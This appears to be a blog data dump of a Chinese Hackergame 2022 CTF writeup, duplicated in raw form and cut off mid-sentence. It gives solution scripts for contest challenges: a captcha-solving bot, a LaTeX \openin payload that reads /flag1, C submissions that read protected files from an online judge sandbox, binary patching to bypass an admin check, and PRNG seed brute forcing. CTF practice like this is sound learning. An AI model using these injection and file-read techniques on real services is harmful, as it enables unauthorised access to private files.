的引用名中后面的数字是年份（）</p>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><ul>\n<li><a href=\"https://www.zhihu.com/question/29969904\">知乎 -「:=」和「=:」的区别是什么？</a></li>\n<li><a href=\"https://link.springer.com/chapter/10.1007/11935230_18\">Santanu Sarkar and Subhamoy Maitra. Some Applications of Lattice Based Root Finding Techniques</a></li>\n<li><a href=\"https://www.cs.umd.edu/~gasarch/TOPICS/attackingRSA.pdf\">[ELL06] E. Jochemsz and A. May. A strategy for finding roots of multivariate polynomials with new applications in attacking RSA variants, Asiacrypt 2006, LNCS 4284, pp. 267–282, 2006.</a></li>\n<li><a href=\"https://www.math.auckland.ac.nz/~sgal018/crypto-book/ch19.pdf\">Coppersmith’s Method and Related Applications</a></li>\n<li><a href=\"https://lord-riot.github.io/2021/01/06/Way-to-CopperSmith/\">lord. Way to CopperSmith</a></li>\n</ul>"},{"title":"Hackergame 2022 writeups","date":"2022-10-30T09:26:00.000Z","_content":"\n好玩，爆赞！\n<!--more-->\n## Summary\n\n不知不觉，离上一年 Hackergame 都一年了 ~~（有点像废话）~~，作为我CTF的启蒙赛， Hackergame 2021 拿分最多的其实还是靠 web ，如今我却出乎意料地成为了队里的密码手。\n今年已经不像上年那么有空，前面的搜索题都没空做。总体来说，虽然做不出来，但好歹也能将大部分题目阅读一遍了。~~（有进步，但不多）~~\n没好意思填学校的组，直接在公开组注册，最终得分 2850 ，总排名 145 ，也就只有 math 榜上能看见我了。\nGZTime 还是如同上年一样直线上分，但意想不到的是 mcfx 也被一个不明来路的直线上分的老六偷了榜一。\n这里记录一下解出的题的题解，对解不出但尝试过的，也作一些记录，多少从中学到了一些东西。\n最近要期中考，断断续续更这里吧。\n\n********************************\n\n## 签到\n\n点开网页，发现是一个手写签名，四个框内，依次要在 2 秒，1 秒，0.1 秒，0.0 秒内分别写下 `2022` 才能通过。\n首先直接靠手速必然是不行的，因为第四个框最多只能留下一个点，于是尝试点了个提交，发现顶上的 url 多了个 `?result=????`，果然还是和上年一样的套路，四个问号改成 2022 ，回车，得到 flag 。\n\n## 猫咪问答喵\n\n第一问直接搜就有，第二问没找到，第三问也直接搜，第四问没找，第六问爆破出来的（）\n第五问也没找出来，但是找到一个网站叫 [Censys.io](https://search.censys.io/data) ，似乎可以搜索 ssh 的 sha256 指纹查 host ，以及有关一堆乱七八糟的查询，不知道以后能不能用得上。\n\n## 家目录里的秘密\n\nLevel1 直接搜目录内文件就有。\nLevel2 没下 Rclone ，以为要找到那个 `rclone.config` 文件里的真实域名再ftp进去。。。\n\n## HeiLang\n\n`Ctrl` + `H`，将 ` | ` 全部替换成 `]=a[` 即可。\n\n## Xcaptcha\n\n用 `pyppeteer` 干了，简单粗暴。\n代码如下：\n\n```python\nimport asyncio\nfrom pyppeteer import launch\nasync def main():\n    browser = await launch({\n        'executablePath': r'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',\n        'headless': False,\n        'args': ['--no-sandbox', '--window-size=1366,850']\n    })\n    page = await browser.newPage()\n    await page.setViewport({'width':1366,'height':768})\n    await page.goto('http://202.38.93.111:10047/?token=<your_token>') \n    await page.click('.img-fluid')\n    captcha1 = await page.querySelectorEval('label[for=\"captcha1\"]', 'node => node.innerText')\n    captcha2 = await page.querySelectorEval('label[for=\"captcha2\"]', 'node => node.innerText')\n    captcha3 = await page.querySelectorEval('label[for=\"captcha3\"]', 'node => node.innerText')\n    res1=eval(captcha1[:-5])\n    res2=eval(captcha2[:-5])\n    res3=eval(captcha3[:-5])\n    await page.type('#captcha1', str(res1))\n    await page.type('#captcha2', str(res2))\n    await page.type('#captcha3', str(res3))\n    await page.click('#submit')\n    \n    flag = await page.querySelectorEval('body > div > p:nth-child(4)', 'node => node.innerText')\n    print(flag)\n    await browser.close()\nasyncio.get_event_loop().run_until_complete(main())\n```\n\n## 旅行照片2.0\n\nLevel1 直接用在线网站就能看，但 EXIF 版本信息显示是 `0231` ，结合题目提示，改成 `2.31` 就行。\nLevel2 一开始谷歌和百度识图都出不来，然后发现识图的结果都是夕阳，于是把图片**截去夕阳部分**再谷歌识图，就能得到拍摄角度几乎一样但是白天的日本千叶市美滨区的海洋球场，然后找机场就找头疼了，放弃。\n在做复变函数的时候无意间发现 wolfram 可以通过看到飞机的地点和时间直接查询航班，但是是会员功能。\n\n## 猜数字（未解出）\n\n写了个脚本暴猜一晚上没出，果然运气还是太差了。\n正解是 `NaN` ，不提。\n这里贴一下我爆破的脚本，供君一乐：\n\n```python\nimport requests as r\nimport re\n\nurl = 'http://202.38.93.111:18000/state'\ncookie = '<your_cookie>'\nauth = '<your_auth>'\n\ndef guess(num):\n    data = f'<state><guess>{num}</guess></state>'\n    r.post(url, headers={'Cookie': cookie, 'authorization': auth}, data=data)\n    \ndef check():\n    res = r.get(url, headers={'Cookie': cookie, 'authorization': auth})\n    resp = re.findall(r'<guess less=\"(\\w+)\" more=\"(\\w+)\">(.*?)</guess>', res.text)\n    if not resp:\n        return ('true', 'true', '0')\n    return resp[0]\n\ndef crack(n):\n    guess(str(n/1000000))\n    less, more, num = check()\n    # print(less, more, num)\n    left = 0\n    right = 1000000\n    times = 1\n    while less != 'true' or more != 'true':\n        times += 1\n        if less == 'true':\n            left = float(num)*1000000\n        elif more == 'true':\n            right = float(num)*1000000\n        else:\n            break\n        num = (left + right) // 2\n        tmp = num\n        guess(str(num/1000000))\n        less, more, num = check()\n        # print(less, more, num)\n    return times, tmp\n\nif __name__ == '__main__':\n    l = [500000]\n    while True:\n        # n = 500000*(len(l)+1) - sum(l)\n        # n = min(n, 1000000)\n        # n = max(n, 0)\n        n = 1000000 - sum(l)//len(l)\n        times, num = crack(n)\n        l.append(int(num))\n        print(times, n, num, sum(l)//len(l))\n        if times == 1:\n            break\n    print('done')\n```\n\n## LaTeX机器人\n\nLevel1 我的解法：\n\n```tex\n\\newread\\myread \\openin\\myread=/flag1 \\read\\myread to \\fileline \\fileline{}\n```\n\nLevel2 打不通，但找到一个可以取消所有转义的函数 ~~（但我忘了是什么）~~。\n\n## 安全的在线测评\n\n我 Level1 的解法，但似乎预期是用编译器读？\n\n```c\n#include <stdio.h>\n\nint main() {\n    // read 2 lines from file\n    char buf[400];\n    scanf(\"%s\", buf);\n\n    FILE *fp = fopen(\"./data/static.out\", \"r\");\n    fgets(buf, 400, fp);\n    printf(\"%s\", buf);\n    fgets(buf, 400, fp);\n    printf(\"%s\", buf);\n    fclose(fp);\n    return 0;\n}\n```\n\n## Flag自动机\n\n第一回正式打逆向，首先题目是一个恶作剧程序，就是不给点 `狠心夺取` 按钮，于是拖进 `IDA` 看到有 `rand` 函数，不难联想到按钮的新位置是通过这个函数产生的，于是再查看 `rand` 函数的调用，发现只有两处——分别是按钮的 X 坐标和 Y 坐标。然后我的解法是把汇编上把位置 patch 成 `0` ，这样按钮就只刷新在左上角了。点击按钮后，弹出一个提示框——`获取flag失败！您不是本机的“超级管理员”！` ，于是再次在 `IDA` 找到一个判断，若该变量不等于 `114514` ，则弹出失败的提示框，这里在汇编把 `jz` patch 成 `jnz` 就行。最后成功获取 flag 。\n\n## 杯窗鹅影\n\nLevel1 我的解法如下：\n\n```c\n#include <stdio.h>\n\n// read file in /flag1\n\nint main(void) {\n    FILE *fp = fopen(\"/flag1\", \"r\");\n    if (fp == NULL) {\n        printf(\"open file failed\");\n    }\n    char buf[0x100];\n    fgets(buf, 0x100, fp);\n    printf(\"%s\", buf);\n    return 0;\n}\n```\n\n## 蒙特卡洛轮盘赌\n\n测试得出 `clock()` 的大小在 1000 左右，那么假定时间基本同步的情况下爆破 1000 次左右即可出结果。\n编译开 `-O3` 的情况下目测大约每秒 20 次，大约在 50s 内可出结果。\n代码如下：\n\n```python\nimport subprocess\nimport time\nfrom pwn import *\nimport os\n\n# compile the c program\nos.system('gcc -o setseed setseed.c -O3')\n\ndef seedtores(seed):\n    p = subprocess.run(\n            ['./setseed', str(seed)],\n            stdout=subprocess.PIPE,\n            stderr=subprocess.STDOUT\n        )\n    return (p.stdout.decode()).split()\n\ndef crack(pi2, t):\n    p1, p2 = pi2\n    while True:\n        res = seedtores(t)\n        print(res[0],res[1], res[2], end='\\r')\n        if res[1] == p1 and res[2] == p2:\n            return t, res\n        else:\n            t += 1\n\nnow = int(time.time())\n\nprint(now)\n\nr = remote('202.38.93.111', 10091)\n\ntoken = b'<your_token>'\nr.sendlineafter(b'token:', token)\nr.sendlineafter('请输入你的猜测（如 3.14159，输入后回车）：'.encode(), b'0')\nr.recvuntil('正确答案是：'.encode())\np1 = r.recvline().decode().strip()\nr.sendlineafter('请输入你的猜测（如 3.14159，输入后回车）：'.encode(), b'0')\nr.recvuntil('正确答案是：'.encode())\np2 = r.recvline().decode().strip()\n\ninfo('p1: %s, p2: %s', p1, p2)\nt, guess = crack((p1, p2), now)\nsuccess('guess: %s', guess)\n\nr.sendlineafter('请输入你的猜测（如 3.14159，输入后回车）：'.encode(), guess[3].encode())\nr.sendlineafter('请输入你的猜测（如 3.14159，输入后回车）：'.encode(), guess[4].encode())\nr.sendlineafter('请输入你的猜测（如 3.14159，输入后回车）：'.encode(), guess[5].encode())\nprint(r.recvlines(3))\n```\n\n其中 `setseed.c` 代码如下：\n\n```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <time.h>\n#include <string.h>\n\ndouble rand01()\n{\n    return (double)rand() / RAND_MAX;\n}\n\n// let main receive a seed\nint main(int argc, char *argv[])\n{\n    // disable buffering\n    setvbuf(stdin, NULL, _IONBF, 0);\n    setvbuf(stdout, NULL, _IONBF, 0);\n    setvbuf(stderr, NULL, _IONBF, 0);\n\n    unsigned int seed = 1666610168+946;\n    seed = atoi(argv[1]);\n    printf(\"%u\\n\",seed);\n    srand(seed-1);\n    int games = 5;\n    int win = 0;\n    int lose = 0;\n    char target[20];\n    char guess[2000];\n    for (int i = games; i > 0; i--) {\n        int M = 0;\n        int N = 400000;\n        for (int j = 0; j < N; j++) {\n            double x = rand01();\n            double y = rand01();\n            if (x*x + y*y < 1) M++;\n        }\n        double pi = (double)M / N * 4;\n        sprintf(target, \"%1.5f\", pi);\n        printf(\"%1.5f\\n\", pi);\n    }\n    return 0;\n}\n```\n\n## 置换魔群\n\n打通了，还行。\n置换群的概念题目已经说得很清楚了，这里不再赘述。\nLevel1 是生成一个置换群 $A_n$ ，并给出 $x^e$ 和 $e=66537$ ，求群 $A_n$ 的元素 $x$ 。\n那么这就很类似 RSA 了，首先 RSA 的解密原理是，对于模 $n$ 群，对其中的**任意元素** $x$ ，都有 $x^{\\varphi(n)}\\equiv1\\mod n$ ，这里的$\\varphi(n)$称为**群的阶**。所以 $m^{ed}\\equiv m^{k\\varphi(n)+1}\\equiv (m^{\\varphi})^km\\equiv m\\mod n$ 。（srds，这竟然是我在做这道题的时候推公式想明白的）\n那么回到这个题就很简单了，只需求出 $A_n$ 的阶，然后取 $e$ 模 $A_n$ 阶的逆元就能得到解密指数 $d$ 了。\n题目给了简陋的求群的阶的函数，但速度比较慢，用 sagemath 实现了一下，快了很多。\n关键代码如下：\n\n```python\ndef solve(n, c, e=65537):\n    S = SymmetricGroup(n)\n    d = pow(e, -1, S.order())\n    res = S(c) ** int(d)\n    return str(list(res.tuple()))   # 这里应该有更优雅的写法\n```\n\nLevel2 同样生成一个置换群 $A_n$ ，给出一个元素 $g$ 和 $g^y$ ，要求 $y$ 。\n那么这就是一个离散对数问题了，用 sagemath 的 `discrete_log` 函数就能解决。\n当然如果你和我一样不知道 sagemath 的置换群用的哪个函数，可以使用万能的 copilot 直接先敲一行注释，然后回车按 `tab` 。\n关键代码如下：（只有两行，乐）\n\n```python\ndef solve(g, y, n):\n    S = SymmetricGroup(n)\n    return discrete_log(S(y), S(g))\n```\n\nLevel3 同样是离散对数问题，允许输入两个元素 $g_1$ 和 $g_2$ ，然后给出 $g_1^m$ 和 $g_2^m$ ，要求 $m$ 。\n上面提到了**群的阶**，这里引入**元素的阶**的概念：比如模 $5$ 的群中，群的阶为 $\\varphi(5)=4$ ，也就是说 $1^4\\equiv2^4\\equiv3^4\\equiv4^4\\mod 5$ ，但是我们发现， $1^1 \\mod1$ 就已经是 $1$ 了， $4^2\\mod 5$ 也一样不需要达到 $4$ 次方就到 $1$ ，这里我们称**最小的** $k$ 使元素 $x$ 满足 $x^k\\equiv1\\mod n$ 为**元素 $x$ 的阶**，也就是说如上的例子中 $1$ 的阶为 $1$ ， $4$ 的阶为 $2$ 。\n现在回到题目，我们发现难点在于要求的 $m$ 是比较大的，记 $g_1$ 和 $g_2$ 的阶分别为 $a$ 和 $b$ ，容易知道我们求离散对数得到的只是 $m_1\\equiv m\\mod a$ 和 $m_2\\equiv m\\mod b$ ，由中国剩余定理可知最后求出的 $m'\\equiv m\\mod \\mathrm{lcm}(a,b)$ ，也就是说，我们构造的 $g_1$ 和 $g_2$ 的阶的**最小公倍数需要足够大**才能得到 $m$ 。\n\n然后不难搜得求置换群元素的阶最大的问题可以转化成求一组数的和不超过 $n$ ，如果使这组数的最小公倍数最大的问题。显然这组数应该是互质的，但**这并不意味着这组数要全为质数**！比如 $n=7$ 时，我们可以得到 $3\\times4$ 是最大的， $3$ 和 $4$ 互质，但 $4$ 不是质数。如此我们可以手推几个，然后在数列网站 OEIS 上搜索得到数列[A000793](https://oeis.org/A000793)，关于这个数列的介绍为 `Landau's function g(n): largest order of permutation of n elements. Equivalently, largest LCM of partitions of n.`\n显然这正是我们要找的，于是复制下面给出的代码就可以生成 $g_1$ 了，而对于 $g_2$ ，我的做法是拿到 $g_2$ 中最大数后面的素数列填充进去，若不能继续填充且空间还有剩余，则使最后两个素数**尽可能大且尽可能相近**。\n最后我的蹩脚算法得出来的界大部分比题目的界要大，有小部分小 $1/10$ 左右，基本上都能大过 $m$ 。\n\n贴一下完整的垃圾代码：\n\n```python\nfrom pwn import *\nfrom sage.all import *\nfrom sympy import primerange, prevprime\n\np = remote(\"202.38.93 .111\", 10114)\n# context.log_level = \"debug\"\ntoken = <your_token>\np.sendlineafter(b\"token: \", token.encode())\np.sendlineafter(b\"> your choice: \", b\"3\")\n\ndef n2perm(l):\n    ll = []\n    i = 1\n    for x in l:\n        ll.append(tuple(range(i, i+x)))\n        i += x\n    return ll\n\ndef aupton(N):  # compute terms a(0)..a(N)\n    V = [1 for _ in range(N+1)]\n    for i in primerange(2, N+1):\n        for j in range(N, i-1, -1):\n            hi = V[j]\n            pp = i\n            while pp <= j:\n                hi = max((pp if j == pp else V[j-pp]*pp), hi)\n                pp *= i\n            V[j] = hi\n    return V\n\ndef get_fac(n):\n    prod = data[n - 1]\n    f = factor(prod)\n    f_ = str(f).split('*')\n    fl = []\n    for i in f_:\n        if '^' in i:\n            fl.append(eval(i.replace('^', '**')))\n        else:\n            fl.append(int(i))\n    return fl\n\ndef get_fac2(n, fl1_prod):\n    fl2 = []\n    i = 2\n    while sum(fl2) < n:\n        if gcd(i, fl1_prod) == 1:\n            fl2.append(i)\n        i += 1\n    if sum(fl2) > n:\n        fl2.pop()\n        fl2.pop()\n        fl2.append(prevprime(n - sum(fl2)))\n    return fl2\n\ndef get_n2l(n):\n    l1 = get_fac(n)\n    l2 = get_fac2(n, prod(l1))\n    return n2perm(l1), n2perm(l2)\n\ndef get_n():\n    p.recvuntil(b'[+] DH public key: n = ')\n    n = int(p.recvline()[:-1].decode())\n    return n\n\ndef get_bound():\n    p.recvuntil(b'[+] The upper bound for my private key is ')\n    bound = int(p.recvline()[:-1].decode())\n    return bound\n\ndef get_pub(g):\n    p.sendlineafter(b'(a list): ',g.encode())\n    p.recvuntil(b' : ')\n    y = eval(p.recvline()[:-1].decode())\n    return y\n\nfor i in range(15):\n    n = get_n()\n    bound = get_bound()\n    info(f\"    n = {n}\")\n    info(f\"bound = {bound}\")\n    S = SymmetricGroup(n)\n    data = aupton(2000)\n    g,g_ = get_n2l(n)\n    g1, g2 = S(g), S(g_)\n    opt = lcm(g1.order(), g2.order())\n    info(f\"  opt = {opt}\")\n    if opt < bound:\n        warning(\"opt < bound\")\n    pub1 = get_pub(str(list(g1.tuple())))\n    pub2 = get_pub(str(list(g2.tuple())))\n    pub1, pub2 = S(pub1), S(pub2)\n    m1, m2 = discrete_log(pub1,g1), discrete_log(pub2,g2)\n    # success(f\"m1 = {m1}\\nm2 = {m2}\")\n    m = crt([m1,m2],[g1.order(),g2.order()])\n    success(f\"    m = {m}\")\n    p.sendlineafter(b'> your answer: ', str(m).encode())\n    res = p.recvline().decode()\n    assert res == 'Good job\\n', res\n\nprint(p.recvline().decode())\n```\n\n## 矩阵之困（未解出）\n\n开赛做完签到后看的第一题，结果最后也成为本场比赛最难的 1 解题（表面看起来是 2 解，但其实两个号都是 mcfx），不得不说我眼光真好（）\n查到三向量内积可表示成 $a^TBc$ ，其中 $B$ 的对角线为 $b$ ，但似乎没什么用。\n用 z3 梭了几天出不来，放弃。\n\n## 片上系统（未解出）\n\n发现 pulseview 还挺有意思。\n\n## 量子藏宝图\n\n挺有意思的，一直只研究后量子密码学，却没看过量子密码，正好补充知识。\n\n## 企鹅拼盘\n\nLevel1 手试即可，结果为 `1000` 。\n\n## 火眼金睛的小E\n\nLevel1 直接装个 bindiff 人工比对，但是正确率不太高，需要多试几次，有时甚至 bindiff 连函数都没检测出来。。。\n","source":"_posts/Hackergame2022-writeups.md","raw":"---\ntitle: Hackergame 2022 writeups\ndate: 2022-10-30 17:26:00\ntags: CTF\ncategories: 题解\n---\n\n好玩，爆赞！\n<!--more-->\n## Summary\n\n不知不觉，离上一年 Hackergame 都一年了 ~~（有点像废话）~~，作为我CTF的启蒙赛， Hackergame 2021 拿分最多的其实还是靠 web ，如今我却出乎意料地成为了队里的密码手。\n今年已经不像上年那么有空，前面的搜索题都没空做。总体来说，虽然做不出来，但好歹也能将大部分题目阅读一遍了。~~（有进步，但不多）~~\n没好意思填学校的组，直接在公开组注册，最终得分 2850 ，总排名 145 ，也就只有 math 榜上能看见我了。\nGZTime 还是如同上年一样直线上分，但意想不到的是 mcfx 也被一个不明来路的直线上分的老六偷了榜一。\n这里记录一下解出的题的题解，对解不出但尝试过的，也作一些记录，多少从中学到了一些东西。\n最近要期中考，断断续续更这里吧。\n\n********************************\n\n## 签到\n\n点开网页，发现是一个手写签名，四个框内，依次要在 2 秒，1 秒，0.1 秒，0.0 秒内分别写下 `2022` 才能通过。\n首先直接靠手速必然是不行的，因为第四个框最多只能留下一个点，于是尝试点了个提交，发现顶上的 url 多了个 `?result=????`，果然还是和上年一样的套路，四个问号改成 2022 ，回车，得到 flag 。\n\n## 猫咪问答喵\n\n第一问直接搜就有，第二问没找到，第三问也直接搜，第四问没找，第六问爆破出来的（）\n第五问也没找出来，但是找到一个网站叫 [Censys.io](https://search.censys.io/data) ，似乎可以搜索 ssh 的 sha256 指纹查 host ，以及有关一堆乱七八糟的查询，不知道以后能不能用得上。\n\n## 家目录里的秘密\n\nLevel1 直接搜目录内文件就有。\nLevel2 没下 Rclone ，以为要找到那个 `rclone.config` 文件里的真实域名再ftp进去。。。\n\n## HeiLang\n\n`Ctrl` + `H`，将 ` | ` 全部替换成 `]=a[` 即可。\n\n## Xcaptcha\n\n用 `pyppeteer` 干了，简单粗暴。\n代码如下：\n\n```python\nimport asyncio\nfrom pyppeteer import launch\nasync def main():\n    browser = await launch({\n        'executablePath': r'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',\n        'headless': False,\n        'args': ['--no-sandbox', '--window-size=1366,850']\n    })\n    page = await browser.newPage()\n    await page.setViewport({'width':1366,'height':768})\n    await page.goto('http://202.38.93.111:10047/?token=<your_token>') \n    await page.click('.img-fluid')\n    captcha1 = await page.querySelectorEval('label[for=\"captcha1\"]', 'node => node.innerText')\n    captcha2 = await page.querySelectorEval('label[for=\"captcha2\"]', 'node => node.innerText')\n    captcha3 = await page.querySelectorEval('label[for=\"captcha3\"]', 'node => node.innerText')\n    res1=eval(captcha1[:-5])\n    res2=eval(captcha2[:-5])\n    res3=eval(captcha3[:-5])\n    await page.type('#captcha1', str(res1))\n    await page.type('#captcha2', str(res2))\n    await page.type('#captcha3', str(res3))\n    await page.click('#submit')\n    \n    flag = await page.querySelectorEval('body > div > p:nth-child(4)', 'node => node.innerText')\n    print(flag)\n    await browser.close()\nasyncio.get_event_loop().run_until_complete(main())\n```\n\n## 旅行照片2.0\n\nLevel1 直接用在线网站就能看，但 EXIF 版本信息显示是 `0231` ，结合题目提示，改成 `2.31` 就行。\nLevel2 一开始谷歌和百度识图都出不来，然后发现识图的结果都是夕阳，于是把图片**截去夕阳部分**再谷歌识图，就能得到拍摄角度几乎一样但是白天的日本千叶市美滨区的海洋球场，然后找机场就找头疼了，放弃。\n在做复变函数的时候无意间发现 wolfram 可以通过看到飞机的地点和时间直接查询航班，但是是会员功能。\n\n## 猜数字（未解出）\n\n写了个脚本暴猜一晚上没出，果然运气还是太差了。\n正解是 `NaN` ，不提。\n这里贴一下我爆破的脚本，供君一乐：\n\n```python\nimport requests as r\nimport re\n\nurl = 'http://202.38.93.111:18000/state'\ncookie = '<your_cookie>'\nauth = '<your_auth>'\n\ndef guess(num):\n    data = f'<state><guess>{num}</guess></state>'\n    r.post(url, headers={'Cookie': cookie, 'authorization': auth}, data=data)\n    \ndef check():\n    res = r.get(url, headers={'Cookie': cookie, 'authorization': auth})\n    resp = re.findall(r'<guess less=\"(\\w+)\" more=\"(\\w+)\">(.*?)</guess>', res.text)\n    if not resp:\n        return ('true', 'true', '0')\n    return resp[0]\n\ndef crack(n):\n    guess(str(n/1000000))\n    less, more, num = check()\n    # print(less, more, num)\n    left = 0\n    right = 1000000\n    times = 1\n    while less != 'true' or more != 'true':\n        times += 1\n        if less == 'true':\n            left = float(num)*1000000\n        elif more == 'true':\n            right = float(num)*1000000\n        else:\n            break\n        num = (left + right) // 2\n        tmp = num\n        guess(str(num/1000000))\n        less, more, num = check()\n        # print(less, more, num)\n    return times, tmp\n\nif __name__ == '__main__':\n    l = [500000]\n    while True:\n        # n = 500000*(len(l)+1) - sum(l)\n        # n = min(n, 1000000)\n        # n = max(n, 0)\n        n = 1000000 - sum(l)//len(l)\n        times, num = crack(n)\n        l.append(int(num))\n        print(times, n, num, sum(l)//len(l))\n        if times == 1:\n            break\n    print('done')\n```\n\n## LaTeX机器人\n\nLevel1 我的解法：\n\n```tex\n\\newread\\myread \\openin\\myread=/flag1 \\read\\myread to \\fileline \\fileline{}\n```\n\nLevel2 打不通，但找到一个可以取消所有转义的函数 ~~（但我忘了是什么）~~。\n\n## 安全的在线测评\n\n我 Level1 的解法，但似乎预期是用编译器读？\n\n```c\n#include <stdio.h>\n\nint main() {\n    // read 2 lines from file\n    char buf[400];\n    scanf(\"%s\", buf);\n\n    FILE *fp = fopen(\"./data/static.out\", \"r\");\n    fgets(buf, 400, fp);\n    printf(\"%s\", buf);\n    fgets(buf, 400, fp);\n    printf(\"%s\", buf);\n    fclose(fp);\n    return 0;\n}\n```\n\n## Flag自动机\n\n第一回正式打逆向，首先题目是一个恶作剧程序，就是不给点 `狠心夺取` 按钮，于是拖进 `IDA` 看到有 `rand` 函数，不难联想到按钮的新位置是通过这个函数产生的，于是再查看 `rand` 函数的调用，发现只有两处——分别是按钮的 X 坐标和 Y 坐标。然后我的解法是把汇编上把位置 patch 成 `0` ，这样按钮就只刷新在左上角了。点击按钮后，弹出一个提示框——`获取flag失败！您不是本机的“超级管理员”！` ，于是再次在 `IDA` 找到一个判断，若该变量不等于 `114514` ，则弹出失败的提示框，这里在汇编把 `jz` patch 成 `jnz` 就行。最后成功获取 flag 。\n\n## 杯窗鹅影\n\nLevel1 我的解法如下：\n\n```c\n#include <stdio.h>\n\n// read file in /flag1\n\nint main(void) {\n    FILE *fp = fopen(\"/flag1\", \"r\");\n    if (fp == NULL) {\n        printf(\"open file failed\");\n    }\n    char buf[0x100];\n    fgets(buf, 0x100, fp);\n    printf(\"%s\", buf);\n    return 0;\n}\n```\n\n## 蒙特卡洛轮盘赌\n\n测试得出 `clock()` 的大小在 1000 左右，那么假定时间基本同步的情况下爆破 1000 次左右即可出结果。\n编译开 `-O3` 的情况下目测大约每秒 20 次，大约在 50s 内可出结果。\n代码如下：\n\n```python\nimport subprocess\nimport time\nfrom pwn import *\nimport os\n\n# compile the c program\nos.system('gcc -o setseed setseed.c -O3')\n\ndef seedtores(seed):\n    p = subprocess.run(\n            ['./setseed', str(seed)],\n            stdout=subprocess.PIPE,\n            stderr=subprocess.STDOUT\n        )\n    return (p.stdout.decode()).split()\n\ndef crack(pi2, t):\n    p1, p2 = pi2\n    while True:\n        res = seedtores(t)\n        print(res[0],res[1], res[2], end='\\r')\n        if res[1] == p1 and res[2] == p2:\n            return t, res\n        else:\n            t += 1\n\nnow = int(time.time())\n\nprint(now)\n\nr = remote('202.38.93.111', 10091)\n\ntoken = b'<your_token>'\nr.sendlineafter(b'token:', token)\nr.sendlineafter('请输入你的猜测（如 3.14159，输入后回车）：'.encode(), b'0')\nr.recvuntil('正确答案是：'.encode())\np1 = r.recvline().decode().strip()\nr.sendlineafter('请输入你的猜测（如 3.14159，输入后回车）：'.encode(), b'0')\nr.recvuntil('正确答案是：'.encode())\np2 = r.recvline().decode().strip()\n\ninfo('p1: %s, p2: %s', p1, p2)\nt, guess = crack((p1, p2), now)\nsuccess('guess: %s', guess)\n\nr.sendlineafter('请输入你的猜测（如 3.14159，输入后回车）：'.encode(), guess[3].encode())\nr.sendlineafter('请输入你的猜测（如 3.14159，输入后回车）：'.encode(), guess[4].encode())\nr.sendlineafter('请输入你的猜测（如 3.14159，输入后回车）：'.encode(), guess[5].encode())\nprint(r.recvlines(3))\n```\n\n其中 `setseed.c` 代码如下：\n\n```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <time.h>\n#include <string.h>\n\ndouble rand01()\n{\n    return (double)rand() / RAND_MAX;\n}\n\n// let main receive a seed\nint main(int argc, char *argv[])\n{\n    // disable buffering\n    setvbuf(stdin, NULL, _IONBF, 0);\n    setvbuf(stdout, NULL, _IONBF, 0);\n    setvbuf(stderr, NULL, _IONBF, 0);\n\n    unsigned int seed = 1666610168+946;\n    seed = atoi(argv[1]);\n    printf(\"%u\\n\",seed);\n    srand(seed-1);\n    int games = 5;\n    int win = 0;\n    int lose = 0;\n    char target[20];\n    char guess[2000];\n    for (int i = games; i > 0; i--) {\n        int M = 0;\n        int N = 400000;\n        for (int j = 0; j < N; j++) {\n            double x = rand01();\n            double y = rand01();\n            if (x*x + y*y < 1) M++;\n        }\n        double pi = (double)M / N * 4;\n        sprintf(target, \"%1.5f\", pi);\n        printf(\"%1.5f\\n\", pi);\n    }\n    return 0;\n}\n```\n\n## 置换魔群\n\n打通了，还行。\n置换群的概念题目已经说得很清楚了，这里不再赘述。\nLevel1 是生成一个置换群 $A_n$ ，并给出 $x^e$ 和 $e=66537$ ，求群 $A_n$ 的元素 $x$ 。\n那么这就很类似 RSA 了，首先 RSA 的解密原理是，对于模 $n$ 群，对其中的**任意元素** $x$ ，都有 $x^{\\varphi(n)}\\equiv1\\mod n$ ，这里的$\\varphi(n)$称为**群的阶**。所以 $m^{ed}\\equiv m^{k\\varphi(n)+1}\\equiv (m^{\\varphi})^km\\equiv m\\mod n$ 。（srds，这竟然是我在做这道题的时候推公式想明白的）\n那么回到这个题就很简单了，只需求出 $A_n$ 的阶，然后取 $e$ 模 $A_n$ 阶的逆元就能得到解密指数 $d$ 了。\n题目给了简陋的求群的阶的函数，但速度比较慢，用 sagemath 实现了一下，快了很多。\n关键代码如下：\n\n```python\ndef solve(n, c, e=65537):\n    S = SymmetricGroup(n)\n    d = pow(e, -1, S.order())\n    res = S(c) ** int(d)\n    return str(list(res.tuple()))   # 这里应该有更优雅的写法\n```\n\nLevel2 同样生成一个置换群 $A_n$ ，给出一个元素 $g$ 和 $g^y$ ，要求 $y$ 。\n那么这就是一个离散对数问题了，用 sagemath 的 `discrete_log` 函数就能解决。\n当然如果你和我一样不知道 sagemath 的置换群用的哪个函数，可以使用万能的 copilot 直接先敲一行注释，然后回车按 `tab` 。\n关键代码如下：（只有两行，乐）\n\n```python\ndef solve(g, y, n):\n    S = SymmetricGroup(n)\n    return discrete_log(S(y), S(g))\n```\n\nLevel3 同样是离散对数问题，允许输入两个元素 $g_1$ 和 $g_2$ ，然后给出 $g_1^m$ 和 $g_2^m$ ，要求 $m$ 。\n上面提到了**群的阶**，这里引入**元素的阶**的概念：比如模 $5$ 的群中，群的阶为 $\\varphi(5)=4$ ，也就是说 $1^4\\equiv2^4\\equiv3^4\\equiv4^4\\mod 5$ ，但是我们发现， $1^1 \\mod1$ 就已经是 $1$ 了， $4^2\\mod 5$ 也一样不需要达到 $4$ 次方就到 $1$ ，这里我们称**最小的** $k$ 使元素 $x$ 满足 $x^k\\equiv1\\mod n$ 为**元素 $x$ 的阶**，也就是说如上的例子中 $1$ 的阶为 $1$ ， $4$ 的阶为 $2$ 。\n现在回到题目，我们发现难点在于要求的 $m$ 是比较大的，记 $g_1$ 和 $g_2$ 的阶分别为 $a$ 和 $b$ ，容易知道我们求离散对数得到的只是 $m_1\\equiv m\\mod a$ 和 $m_2\\equiv m\\mod b$ ，由中国剩余定理可知最后求出的 $m'\\equiv m\\mod \\mathrm{lcm}(a,b)$ ，也就是说，我们构造的 $g_1$ 和 $g_2$ 的阶的**最小公倍数需要足够大**才能得到 $m$ 。\n\n然后不难搜得求置换群元素的阶最大的问题可以转化成求一组数的和不超过 $n$ ，如果使这组数的最小公倍数最大的问题。显然这组数应该是互质的，但**这并不意味着这组数要全为质数**！比如 $n=7$ 时，我们可以得到 $3\\times4$ 是最大的， $3$ 和 $4$ 互质，但 $4$ 